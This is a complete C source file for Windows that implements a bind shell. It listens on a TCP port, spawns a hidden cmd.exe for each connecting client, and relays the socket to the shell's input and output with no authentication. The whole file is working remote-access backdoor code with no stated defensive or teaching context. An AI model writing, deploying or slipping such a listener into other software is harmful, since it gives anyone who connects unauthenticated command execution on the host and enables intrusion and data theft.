#include <windows.h>
#include <winsock2.h>
#include <stdio.h>

#pragma comment(lib, "ws2_32.lib")

#define PORT 8888
#define BUFFER_SIZE 4096

typedef struct {
    HANDLE read_pipe;
    HANDLE write_pipe;
} Pipe;

typedef struct {
    SOCKET socket;
    HANDLE process_stdin;
    HANDLE process_stdout;
    HANDLE child_process;
    int stop_flag;
} ClientSession;

int create_pipes(Pipe* stdin_pipe, Pipe* stdout_pipe) {
    SECURITY_ATTRIBUTES sa = {sizeof(SECURITY_ATTRIBUTES), NULL, TRUE};
    
    if (!CreatePipe(&stdin_pipe->read_pipe, &stdin_pipe->write_pipe, &sa, 0)) return 0;
    if (!CreatePipe(&stdout_pipe->read_pipe, &stdout_pipe->write_pipe, &sa, 0)) return 0;
    
    SetHandleInformation(stdin_pipe->write_pipe, HANDLE_FLAG_INHERIT, 0);
    SetHandleInformation(stdout_pipe->read_pipe, HANDLE_FLAG_INHERIT, 0);
    
    return 1;
}

int create_child_process(HANDLE stdin_read, HANDLE stdout_write, HANDLE* child_process) {
    STARTUPINFO startup_info = {0};
    PROCESS_INFORMATION process_info = {0};
    
    startup_info.cb = sizeof(startup_info);
    startup_info.dwFlags = STARTF_USESTDHANDLES;
    startup_info.hStdInput = stdin_read;
    startup_info.hStdOutput = stdout_write;
    startup_info.hStdError = stdout_write;
    
    int success = CreateProcess(
        NULL, "cmd.exe", NULL, NULL, TRUE,
        CREATE_NO_WINDOW, NULL, NULL, 
        &startup_info, &process_info
    );
    
    if (success) {
        *child_process = process_info.hProcess;
        CloseHandle(process_info.hThread);
        printf("Child process created\n");
    } else {
        printf("CreateProcess failed\n");
    }
    
    return success;
}

DWORD WINAPI socket_to_pipe_thread(LPVOID param) {
    ClientSession* session = (ClientSession*)param;
    char buffer[BUFFER_SIZE];
    
    printf("Socket to pipe thread started\n");
    
    while (!session->stop_flag) {
        int bytes_read = recv(session->socket, buffer, sizeof(buffer)-1, 0);
        
        if (bytes_read > 0) {
            DWORD bytes_written;
            WriteFile(session->process_stdin, buffer, bytes_read, &bytes_written, NULL);
        } else if (bytes_read == 0) {
            printf("Client disconnected\n");
            break;
        } else {
            if (WSAGetLastError() != WSAEWOULDBLOCK) break;
            Sleep(10);
        }
    }
    
    session->stop_flag = 1;
    return 0;
}

DWORD WINAPI pipe_to_socket_thread(LPVOID param) {
    ClientSession* session = (ClientSession*)param;
    char buffer[BUFFER_SIZE];
    DWORD bytes_read;
    
    printf("Pipe to socket thread started\n");
    
    while (!session->stop_flag) {
        if (ReadFile(session->process_stdout, buffer, sizeof(buffer)-1, &bytes_read, NULL)) {
            if (bytes_read > 0) {
                send(session->socket, buffer, bytes_read, 0);
            }
        } else {
            break;
        }
    }
    
    session->stop_flag = 1;
    return 0;
}

void handle_client(SOCKET client_socket) {
    Pipe stdin_pipe, stdout_pipe;
    ClientSession session = {0};
    HANDLE threads[2];
    
    printf("New client connected\n");
    
    session.socket = client_socket;
    
    if (!create_pipes(&stdin_pipe, &stdout_pipe)) {
        printf("Failed to create pipes\n");
        goto cleanup;
    }
    
    if (!create_child_process(stdin_pipe.read_pipe, stdout_pipe.write_pipe, &session.child_process)) {
        printf("Failed to create child process\n");
        goto cleanup;
    }
    
    session.process_stdin = stdin_pipe.write_pipe;
    session.process_stdout = stdout_pipe.read_pipe;
    
    CloseHandle(stdin_pipe.read_pipe);
    CloseHandle(stdout_pipe.write_pipe);
    
    u_long mode = 1;
    ioctlsocket(client_socket, FIONBIO, &mode);
    
    threads[0] = CreateThread(NULL, 0, socket_to_pipe_thread, &session, 0, NULL);
    threads[1] = CreateThread(NULL, 0, pipe_to_socket_thread, &session, 0, NULL);
    
    if (!threads[0] || !threads[1]) {
        printf("Failed to create threads\n");
        session.stop_flag = 1;
    }
    
    WaitForMultipleObjects(2, threads, TRUE, INFINITE);
    
    printf("Client session ended\n");

cleanup:
    session.stop_flag = 1;
    
    if (client_socket != INVALID_SOCKET) {
        shutdown(client_socket, 2);
        closesocket(client_socket);
    }
    
    if (threads[0]) CloseHandle(threads[0]);
    if (threads[1]) CloseHandle(threads[1]);
    if (session.process_stdin) CloseHandle(session.process_stdin);
    if (session.process_stdout) CloseHandle(session.process_stdout);
    if (session.child_process) {
        TerminateProcess(session.child_process, 0);
        CloseHandle(session.child_process);
    }
}

int main(int argc, char* argv[]) {
    WSADATA wsa_data;
    SOCKET listen_socket;
    struct sockaddr_in server_addr;
    const char* bind_ip = NULL;
    int port = PORT;
    
    if (argc > 1) bind_ip = argv[1];
    if (argc > 2) port = atoi(argv[2]);
    
    printf("Starting server...\n");
    printf("Binding to: %s, Port: %d\n", bind_ip ? bind_ip : "all interfaces", port);
    
    if (WSAStartup(MAKEWORD(2, 2), &wsa_data) != 0) {
        printf("WSAStartup failed\n");
        return 1;
    }
    
    listen_socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (listen_socket == INVALID_SOCKET) {
        printf("Socket creation failed\n");
        return 1;
    }
    
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(port);
    server_addr.sin_addr.s_addr = bind_ip ? inet_addr(bind_ip) : INADDR_ANY;
    
    if (bind(listen_socket, (struct sockaddr*)&server_addr, sizeof(server_addr)) == SOCKET_ERROR) {
        printf("Bind failed\n");
        closesocket(listen_socket);
        return 1;
    }
    
    if (listen(listen_socket, SOMAXCONN) == SOCKET_ERROR) {
        printf("Listen failed\n");
        closesocket(listen_socket);
        return 1;
    }
    
    printf("Server listening on port %d\n", port);
    printf("Waiting for connections...\n");
    
    while (1) {
        struct sockaddr_in client_addr;
        int client_addr_len = sizeof(client_addr);
        
        SOCKET client_socket = accept(listen_socket, (struct sockaddr*)&client_addr, &client_addr_len);
        if (client_socket != INVALID_SOCKET) {
            printf("Client connected from %s:%d\n", 
                   inet_ntoa(client_addr.sin_addr), ntohs(client_addr.sin_port));
            handle_client(client_socket);
        }
    }
    
    closesocket(listen_socket);
    WSACleanup();
    return 0;
}
